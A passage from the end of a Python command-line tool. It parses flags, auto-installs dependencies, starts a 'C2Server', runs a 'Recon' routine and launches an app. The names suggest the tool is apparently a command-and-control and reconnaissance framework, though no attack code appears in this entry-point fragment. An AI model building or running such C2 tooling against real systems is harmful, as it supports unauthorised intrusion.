    parser.add_argument("--install", action="store_true", help="Install deps and exit")
    parser.add_argument("--set-up", action="store_true", help="Alias for --install")
    parser.add_argument("--recon", action="store_true", help="One-shot recon")
    parser.add_argument("--no-install", action="store_true", help="Skip auto-install")
    args = parser.parse_args()

    if not args.no_install and not _verify_install():
        auto_install(force=True)

    if args.install or args.set_up:
        console.print("[bold green]✓ Installation complete[/bold green]"); return

    if args.server:
        s = C2Server()
        try: s.start()
        except KeyboardInterrupt: print("\nServer stopped.")
        return

    if args.recon:
        async def do_recon():
            r = Recon(); data = await r.full()
            console.print(Panel(json.dumps(data,indent=2,default=str)[:3000],title="[cyan]Recon Results[/cyan]"))
        asyncio.run(do_recon())
        return

    app = App()
    try: asyncio.run(app.run())
    except KeyboardInterrupt: console.print("\n[red]Shutdown[/red]")

if __name__ == "__main__":
    main()
